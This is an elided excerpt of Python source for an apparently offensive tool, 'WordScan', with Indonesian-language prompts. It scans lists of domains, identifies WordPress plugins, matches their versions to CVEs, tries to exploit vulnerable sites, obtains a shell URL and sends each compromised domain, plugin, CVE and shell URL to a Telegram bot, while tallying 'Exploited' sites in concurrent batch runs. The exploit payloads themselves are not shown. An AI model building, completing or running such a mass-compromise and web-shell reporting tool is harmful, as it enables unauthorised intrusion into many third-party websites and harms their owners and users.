...
class WordScan:
                ...
                if response and response.get("status") == 200:
                    ...
                    if cms_result.name == "WordPress":
                        ...
                        for plugin in plugins:
                            vuln = CVEMatcher.match(plugin.name.lower().replace(" ", "-"), plugin.version)
                            if vuln:
                                    ...
                                    if success:
                                        ...
                                        if self.telegram:
                                            await self.telegram.send_exploited(
                                                domain, plugin.name, plugin.version, 
                                                vuln.cve, shell_url
                                            )
                                    else:
    ...
    async def run(self):
        ...
        while True:
            profile = input("    [!] Pilih profile [default: balanced]: ").strip().lower()
            if not profile:
                profile = "balanced"
        ...
        # ============================================================
        print("\n[3] Output Directory")
        folder_name = input("    [!] Masukkan nama output folder [ENTER untuk auto]: ").strip()
        if not folder_name:
        ...
        if telegram_file.exists():
            try:
                with open(telegram_file, 'r') as f:
                    config = json.load(f)
                    self.telegram = TelegramReporter(config.get("bot_token"), config.get("chat_id"))
        ...
        async def scan_with_semaphore(domain, index):
            async with semaphore:
                ...
                # Progress
                print(f"\r[{index+1}/{len(self.domains)}] Scanned: {self.scanned} | 🔴 Vulnerable: {self.vulnerable} | 💀 Exploited: {self.exploited} | 💀 Dead: {self.dead}", end="")
                return result
        
        tasks = [scan_with_semaphore(domain, i) for i, domain in enumerate(self.domains)]
        ...
        if self.telegram:
            await self.telegram.send_complete(
                len(self.domains), self.scanned, self.vulnerable, 
                self.exploited, self.dead, self.end_time - self.start_time
            )
